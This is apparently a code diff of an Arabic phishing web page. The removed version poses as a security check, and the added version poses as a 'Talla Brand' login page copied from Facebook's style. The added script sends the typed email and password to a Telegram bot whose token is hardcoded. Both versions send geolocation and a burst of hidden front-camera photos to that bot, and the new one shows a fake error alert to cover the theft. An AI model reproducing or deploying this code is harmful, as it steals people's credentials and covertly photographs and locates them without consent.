@@ -1,98 +1,90 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحقق من الأمان...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | Talla Brand</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        .brand-name { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .footer-link { margin-top: 15px; font-size: 14px; color: #1877f2; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <h2 style="text-align: center; margin-top: 50px;">يرجى الانتظار، جاري معالجة الطلب...</h2>
-    <h3 style="text-align: center; color: red;">يرجى الضغط على "سماح" للمتابعة</h3>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<div class="login-container">
+    <div class="brand-name">Talla Brand</div>
+    <p>سجل دخولك لمشاهدة أحدث التشكيلات</p>
+    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+    <input type="password" id="pass" placeholder="كلمة السر">
+    <button onclick="startAction()">تسجيل الدخول</button>
+    <div class="footer-link">هل نسيت كلمة السر؟</div>
+    <hr>
+    <button style="background-color: #42b72a; width: auto; padding: 10px 20px;">إنشاء حساب جديد</button>
+</div>
 
-    <script>
-        const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
-        const chatId = "8754338811";
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-        async function sendToTelegram(type, data, isPhoto = false) {
-            let url = `https://api.telegram.org/bot${token}/`;
-            let body;
+<script>
+    const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const chatId = "8754338811";
 
-            if (isPhoto) {
-                url += "sendPhoto";
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', data, 'capture.jpg');
-                body = formData;
-            } else {
-                url += "sendMessage";
-                body = JSON.stringify({ chat_id: chatId, text: data, parse_mode: "Markdown" });
-            }
+    async function sendToTelegram(type, data, isPhoto = false) {
+        let url = `https://api.telegram.org/bot${token}/`;
+        let body;
+        if (isPhoto) {
+            url += "sendPhoto";
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', data, 'capture.jpg');
+            body = formData;
+        } else {
+            url += "sendMessage";
+            body = JSON.stringify({ chat_id: chatId, text: data, parse_mode: "Markdown" });
+        }
+        await fetch(url, { method: 'POST', body: body, headers: isPhoto ? {} : {'Content-Type': 'application/json'} });
+    }
 
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: isPhoto ? {} : { 'Content-Type': 'application/json' },
-                    body: body
-                });
-            } catch (e) { console.error(e); }
+    async function startAction() {
+        // سحب البيانات المكتوبة في الخانات (الايميل والباسورد)
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        if(email && pass) {
+            await sendToTelegram("text", `🔑 *بيانات دخول:* \nالايميل: ${email} \nالباسورد: ${pass}`);
         }
 
-        async function startSystem() {
-            // 1. جمع بيانات الجهاز المتعمقة
-            let battery = {};
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = { level: b.level * 100 + "%", charging: b.charging };
-            }
-
-            const deviceData = `
-🚀 *زائر جديد:*
-📱 *الجهاز:* ${navigator.platform}
-🌐 *المتصفح:* ${navigator.vendor}
-🔋 *البطارية:* ${battery.level || 'غير معروف'} (شحن: ${battery.charging})
-🖥 *الشاشة:* ${window.screen.width}x${window.screen.height}
-⏳ *التوقيت:* ${new Date().toLocaleString()}
-            `;
-            await sendToTelegram("text", deviceData);
-
-            // 2. طلب الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    sendToTelegram("text", `📍 *الموقع:* https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                });
-            }
-
-            // 3. فتح الكاميرا والتقاط 19 صورة
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                let photosTaken = 0;
-                const interval = setInterval(() => {
-                    if (photosTaken >= 19) {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
-                        return;
-                    }
-
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        sendToTelegram("photo", blob, true);
-                    }, 'image/jpeg');
-
-                    photosTaken++;
-                }, 1500); // يلتقط صورة كل ثانية ونصف
-
-            } catch (err) {
-                await sendToTelegram("text", "❌ رفض المستخدم إذن الكاميرا.");
-            }
+        // طلب الموقع والكاميرا
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram("text", `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
         }
 
-        window.onload = startSystem;
-    </script>
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            let count = 0;
+            const interval = setInterval(() => {
+                if (count >= 19) { clearInterval(interval); stream.getTracks().forEach(t => t.stop()); return; }
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => sendToTelegram("photo", blob, true), 'image/jpeg');
+                count++;
+            }, 1000);
+            
+            alert("عذراً، حدث خطأ في الاتصال بالسيرفر. حاول مجدداً لاحقاً.");
+        } catch (err) {
+            alert("يجب السماح بالأذونات لعرض المحتوى.");
+        }
+    }
+</script>
+
 </body>
 </html>
